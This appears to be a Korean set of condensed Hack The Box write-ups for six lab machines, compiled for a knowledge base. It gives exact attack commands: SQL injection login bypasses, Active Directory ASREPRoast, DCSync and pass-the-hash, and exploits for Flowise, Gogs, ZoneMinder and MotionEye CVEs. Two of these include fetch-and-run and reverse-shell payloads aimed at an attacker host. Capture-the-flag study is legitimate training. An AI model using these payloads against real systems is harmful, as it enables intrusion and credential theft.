# HTB 라이트업 배치3 추출 기법 (KB 변환용)

### Sequel (Linux) 3306 mysql/mariadb
- nmap 에 3306 MySQL 5.5.5-10.3.27-MariaDB. mysql -h {t} -u root (비번 없이, 비번프롬프트 Enter)
- 비번없는 root 로그인 성공 → SHOW databases; → USE htb; → SHOW tables; (config, users)
- SELECT * FROM config; → flag 행에 값. (users 테이블엔 자격 해시 가능 → 크랙 재사용)
- 교훈: DB 서비스는 비번없는/기본 root 먼저. mysql/mariadb -h {t} -u root

### Appointment (Linux) 80 http(Apache, Login)
- gobuster 로 경로 탐색(별무소득) → 로그인폼 SQLi 시도
- PHP 가 SELECT * FROM users WHERE username='$u' AND password='$p' (입력검증 없음)
- 인증우회: Username=admin'#  (또는 admin' -- -, ' or 1=1 -- -), Password=아무거나
  → #/-- 가 비번체크 주석처리 → username='admin' 1행 → 로그인 성공 → flag
- 교훈: 로그인폼 먼저 admin'# / ' or 1=1-- - 로 SQLi 우회 시도

### Forest (Windows AD DC) 53/88/135/139/389/445/464/593/636/3268/5985/9389  [핵심 AD]
- nmap 에 Kerberos88+LDAP389/3268+SMB445+WinRM5985+DNS53 = 도메인 컨트롤러. htb.local → /etc/hosts.
  smb-os-discovery 로 도메인/포리스트명 확인.
- LDAP 익명 바인드: ldapsearch -x -H ldap://{t}:389 -b "dc=htb,dc=local" (null bind 가능 확인)
- 유저열거: windapsearch.py -d htb.local --dc-ip {t} -U  (또는 --custom "objectClass=*")
  → 서비스계정 svc-alfresco 발견(Exchange 설치 도메인)
- ASREPRoast(Kerberos pre-auth disabled): impacket-GetNPUsers htb.local/svc-alfresco -dc-ip {t} -no-pass
  → $krb5asrep$23$ 해시 → john --format=krb5asrep -w rockyou (hashcat -m18200) → s3rvice
- evil-winrm -i {t} -u svc-alfresco -p s3rvice → user.txt
- privesc: SharpHound.exe -c All 업로드/실행 → zip 다운 → BloodHound 분석(소유자 표시)
  svc-alfresco ∈ Account Operators(중첩) → Exchange Windows Permissions 그룹이 도메인에 WriteDACL
- 공격: net user john abc123! /add /domain; net group "Exchange Windows Permissions" john /add;
  net localgroup "Remote Management Users" john /add
  → PowerView: $cred=... ; Add-ObjectACL -PrincipalIdentity john -Rights DCSync
- DCSync: impacket-secretsdump htb/john@{t} → 전 도메인 NTLM 해시(Administrator:500:...)
- Pass-the-Hash: evil-winrm -i {t} -u administrator -H <NT해시> → root.txt
- 교훈(AD): LDAP 익명→유저열거→ASREPRoast/Kerberoast→BloodHound→ACL악용(DCSync)→secretsdump→PtH

### Facts (Linux) 22 ssh / 80 nginx(facts.htb) / 54321 MinIO
- nmap 54321 = MinIO(Golang, S3 호환). facts.htb → /etc/hosts. 웹 = Camaleon CMS(theme camaleon_first)
- /admin 로그인+회원가입 활성 → 계정생성(client 역할). Camaleon CMS 2.9.0 → CVE-2025-2304
  (password-change mass assignment, Rails permit!). Burp 로 비번변경 요청에 password[role]=admin 추가
  → 재로그인 시 Administrator 권한
- 관리설정 Filesystem Settings 에 AWS S3 키 노출(endpoint http://localhost:54321, bucket, AKIA.../secret)
- aws configure --profile facts (노출키) → aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls
  → internal + randomfacts 버킷. s3 ls s3://internal/.ssh/ → id_ed25519(암호화) → s3 cp 다운로드
- ssh2john id_ed25519 > hash.txt → john -w rockyou → dragonballz 패스프레이즈.
  ssh-keygen -y -f id_ed25519 → user@hostname = trivia@facts.htb
- ssh -i id_ed25519 trivia@facts.htb (passphrase dragonballz) → user.txt(/home/william/user.txt 읽기)
- privesc: sudo -l → (ALL)NOPASSWD /usr/bin/facter. facter(Puppet) 커스텀 Ruby facts 실행.
  GTFOBins: mkdir /tmp/x; echo 'exec("/bin/bash")'>/tmp/x/exploit.rb; sudo facter --custom-dir /tmp/x → root
- 교훈: 앱 설정의 클라우드 자격 노출→S3 버킷 열거. sudo 바이너리는 GTFOBins 확인(--custom-dir Ruby)

### Silentium (Linux, 2026) 22 ssh / 80 nginx(silentium.htb)  [최신 CVE 체인]
- silentium.htb → /etc/hosts. ffuf -H "Host: FFUZ.silentium.htb" -fs <기본크기> → staging 서브도메인
- dirsearch http://staging.silentium.htb → manifest.json → "Flowise" 앱. /api/v1/version → Flowise 3.0.5
- CVE-2025-58434(Flowise 비번리셋 토큰 노출): 랜딩페이지 Leadership 에서 사용자 ben.
  curl -XPOST http://staging.../api/v1/account/forgot-password -d '{"user":{"email":"ben@silentium.htb"}}'|jq
  → 응답에 tempToken 노출 → Reset Password 페이지에 토큰+새비번 → ben 로 Flowise 로그인
- CVE-2025-59528(Flowise CustomMCP RCE): API Keys 에서 키 확보.
  curl -XPOST .../api/v1/node-load-method/customMCP -H "Authorization: Bearer <key>"
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"curl {atk}:5050/script.sh|/bin/sh\");return 1;})()})"}}'
  → Docker 컨테이너 내 root 리버스셸(nc -lvnp)
- lateral: ls -la / 에 .dockerenv(컨테이너). env → FLOWISE_PASSWORD, SMTP_PASSWORD=r04D!!_R4ge, SENDER_EMAIL=ben@silentium.htb
  → ssh ben@{t} (SMTP 비번 재사용) → /home/ben/user.txt
- privesc: /etc/nginx/sites-enabled/staging-v2-code → staging-v2-code.dev.silentium.htb → 127.0.0.1:3001
  → /etc/hosts. Gogs 인스턴스 발견, 회원가입. /opt/gogs/gogs --version → Gogs 0.13.3
- CVE-2025-8110(Gogs 심볼릭링크 임의쓰기): repo 생성 → cd repo; ln -s /root/.ssh/authorized_keys overwrite_me;
  git commit/push → git ls-tree HEAD overwrite_me (blob SHA). Gogs 토큰 생성. SSH 공개키 base64.
  curl -XPUT -H "Authorization: token <t>" .../api/v1/repos/<u>/<r>/contents/overwrite_me?ref=master
  -d '{"message":"x","content":"<b64pubkey>","sha":"<blobSHA>"}' → /root/.ssh/authorized_keys 에 공개키 기록
  → ssh root@{t} → root.txt
- 교훈: nginx sites-enabled 로 내부 서비스(3001) 발견. 최신 앱은 버전→CVE 매핑 필수(Flowise/Gogs)

### CCTV (Linux, 2026) 22 ssh / 80 apache(cctv.htb)  [CCTV SW 체인]
- cctv.htb → /etc/hosts. SecureVision 사이트 → Staff Login → /zm → ZoneMinder 로그인
- ZoneMinder 기본자격 admin:admin → 대시보드. 버전 1.37.63 → CVE-2024-51482(Boolean SQLi, web/ajax/event.php tid)
  sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1'
  --cookie=ZMSESSID=... -D zm -T Users -C Username,Password --dump → bcrypt 해시
  hashcat -m3200 hashes rockyou → mark:opensesame → ssh mark@cctv.htb
- enum: /opt/video/backups/server.log(sa_mark 매분 인증, Docker uid 1005). getcap /usr/bin/tcpdump → cap_net_raw=eip
  → 도커 브리지 스니핑: tcpdump -i br-xxxx -A -s0 tcp → USERNAME=sa_mark;PASSWORD=Xll9fx1ZjS7RZb;CMD=disk-info
  → ssh sa_mark@cctv.htb → user.txt
- privesc: netstat -tulnp → 내부 127.0.0.1:8765 등. ssh -L 8765:127.0.0.1:8765 sa_mark@{t}
  → MotionEye 로그인 admin:Xll9fx1ZjS7RZb(재사용). MotionEye 0.43.1b4 / Motion 4.7.1 → CVE-2025-60787
  (Image/Movie File Name 명령주입, /etc/motioneye/camera-x.conf picture_filename 셸파싱)
  클라이언트검증 우회: 브라우저 콘솔 configUiValid=function(){return true;}
  Image File Name=$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/{atk}/9001 0>&1\"')").%Y-%m-%d-%H-%M-%S
  → Interval Snapshots 1s → Apply → nc -lvnp 9001 → root(MotionEye 가 root) → root.txt
- 교훈: getcap 로 cap_net_raw → tcpdump 평문자격 스니핑. 내부포트는 ssh -L 포워딩. 앱 버전→CVE.
  클라이언트측 JS 검증은 콘솔 override 로 우회.
